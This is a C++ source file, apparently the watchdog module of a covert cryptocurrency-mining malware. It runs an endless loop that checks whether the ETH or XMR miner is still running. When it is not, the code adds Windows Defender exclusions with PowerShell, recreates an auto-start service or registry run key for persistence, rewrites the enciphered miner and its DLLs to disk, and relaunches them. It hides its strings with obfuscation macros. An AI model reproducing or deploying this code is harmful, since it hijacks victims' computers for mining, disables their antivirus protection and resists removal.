#include "Includes/ntddk.h"

#include "Includes/common.h"
#include "Includes/obfuscateu.h"
#include "Includes/watchdog.h"

void watchdog() {
    UNICODE_STRING ustring = init_unicode_string(AYU_OBFW(L"\\BaseNamedObjects\\" LWATCHDOGID));
    OBJECT_ATTRIBUTES attr = {0};
    InitializeObjectAttributes(&attr, &ustring, 0, NULL, NULL);

    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return;
    }

    bool isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT) SWU_GetPEB();
    wchar_t *pebenv = (wchar_t *) peb->ProcessParameters->Environment;

    wchar_t sysdir[MAX_PATH] = {0};
    combine_path(sysdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")), AYU_OBFW(L"\\System32"));

    wchar_t cmdPath[MAX_PATH] = {0};
    combine_path(cmdPath, sysdir, AYU_OBFW(L"\\cmd.exe"));

    wchar_t powershellPath[MAX_PATH] = {0};
    combine_path(powershellPath, sysdir, AYU_OBFW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

    wchar_t startupPath[MAX_PATH] = {0};
    combine_path(startupPath, get_env(pebenv, isAdmin ? AYU_OBFW(L"PROGRAMDATA=") : AYU_OBFW(L"APPDATA=")),
                 AYU_OBFW(LSTARTUPFILE));

    wchar_t regPath[MAX_PATH] = {0};
    combine_path(regPath, sysdir, AYU_OBFW(L"\\reg.exe"));

    wchar_t scPath[MAX_PATH] = {0};
    combine_path(scPath, sysdir, AYU_OBFW(L"\\sc.exe"));

#if DefMineETH
    bool hasGPU = has_gpu();
#endif

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -(AYU_OBFC(5000 * 10000));
    PVOID dllFile[MAX_DLL_FILES][3];
    std::wstring startupDir;
    PVOID minerFile;
    ULONG fileSize;
    minerFile = read_file(startupPath, &fileSize);

    cipher((BYTE *) minerFile, fileSize);
    startupDir = GetFileDirectory(startupPath);
    wchar_t dllFiles[MAX_DLL_FILES][MAX_PATH];
    int dllCount = GetDllFilesInDirectory(startupDir.c_str(), dllFiles);
    for (int i = 0; i < dllCount; i++) {
        auto dll = dllFiles[i];
        auto dllPath = (wchar_t *) malloc(sizeof(wchar_t) * MAX_PATH);
        wcscpy(dllPath, startupDir.c_str());
        wcscat(dllPath, dll);
        auto dllFileSize = (ULONG *) malloc(sizeof(ULONG));
        dllFile[i][0] = read_file(dllPath, dllFileSize);
        dllFile[i][1] = (PVOID) dllFileSize;
        dllFile[i][2] = dllPath;
        cipher((BYTE *) dllFile[i][0], *dllFileSize);
    }

    wchar_t ntPath[MAX_PATH + 4] = {0};
    combine_path(ntPath, AYU_OBFW(L"\\??\\"), startupPath);
    ustring = init_unicode_string(ntPath);
    InitializeObjectAttributes(&attr, &ustring, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);
    FILE_BASIC_INFORMATION file_info;

    while (true) {
        UtDelayExecution(FALSE, &sleeptime);
        bool minerMissing = false;
#if DefMineETH
        if (hasGPU && !check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerETHID))) {
            minerMissing = true;
        }
#endif
#if DefMineXMR
        if (!check_mutex(AYU_OBFW(L"\\BaseNamedObjects\\" LMinerXMRID))) {
            minerMissing = true;
        }
#endif
        bool isAdminInstalled = !isAdmin || install_check(startupPath);
        if ((!check_mutex(AYU_OBFW(LMUTEXMINER)) && minerMissing) ||
            !NT_SUCCESS(UtQueryAttributesFile(&attr, &file_info)) || !isAdminInstalled) {
#if DefWDExclusions
            run_program(true, sysdir, powershellPath, AYU_OBFW(
                    L"%S Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramData,$env:windir) -ExclusionExtension '.exe' -Force"),
                        powershellPath);
#endif
            if (isAdmin) {
                if (!isAdminInstalled) {
                    run_program(true, sysdir, scPath, AYU_OBFW(L"%S delete \"%S\""), scPath, LSTARTUPENTRYNAME);
                    run_program(true, sysdir, scPath, AYU_OBFW(L"%S create \"%S\" binpath= \"%S\" start= \"auto\""),
                                scPath, LSTARTUPENTRYNAME, startupPath);
                }
            } else {
                run_program(true, sysdir, regPath, AYU_OBFW(L"%S #STARTUPADDUSER"), regPath, startupPath);
            }

            cipher((BYTE *) minerFile, fileSize);
            write_file(startupPath, minerFile, fileSize);
            cipher((BYTE *) minerFile, fileSize);
            for (int i = 0; i < dllCount; ++i) {
                cipher((BYTE *) dllFile[i][0], *(ULONG *) dllFile[i][1]);
                write_file((wchar_t *) dllFile[i][2], dllFile[i][0], *(ULONG *) dllFile[i][1]);
                cipher((BYTE *) dllFile[i][0], *(ULONG *) dllFile[i][1]);
            }
            run_program(false, sysdir, startupPath, AYU_OBFW(L"\"%S\""), startupPath);
        }
    }

    UtClose(hMutex);
}

#ifndef DISABLE_INJECT_PROCESS

int main(int argc, char *argv[]) {
    watchdog();
    return 0;
}

#endif